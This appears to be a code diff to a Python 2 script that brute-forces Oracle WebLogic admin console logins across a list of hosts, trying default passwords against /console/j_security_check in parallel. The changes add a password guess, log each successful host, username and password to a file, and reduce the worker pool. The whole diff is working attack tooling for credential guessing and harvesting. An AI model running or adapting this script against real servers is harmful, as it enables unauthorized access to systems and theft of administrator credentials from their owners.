@@ -10,7 +10,7 @@ import re
 
 def brute_force(ip_port):
     unames = ['weblogic']
-    pwds = ['weblogic', 'weblogic123', 'weblogic1']
+    pwds = ['weblogic', 'weblogic123', 'pwweblogic1','weblogic1']
     url = 'http://' + ip_port[0] + ':' + ip_port[1] + '/console/j_security_check'
 
     #print url,
@@ -24,6 +24,9 @@ def brute_force(ip_port):
 
                 if re.search('Console', r.text) and re.search('Domain', r.text):
                     #print r.text
+                    f = open('weblogic_vul.txt','a')
+                    f.write(url + ':' + uname + ':' + pwd + '\n')
+                    f.close()
                     print "%s have vul: %s:%s" % (url,uname, pwd)
             except Exception, e:
                 print e
@@ -40,7 +43,7 @@ if __name__ == '__main__':
             urls.append([ip, line.split(',')[1]])
 
     #print urls
-    pool = Pool(40)
+    pool = Pool(20)
     pool.map(brute_force, urls)
     pool.close()
     pool.join()
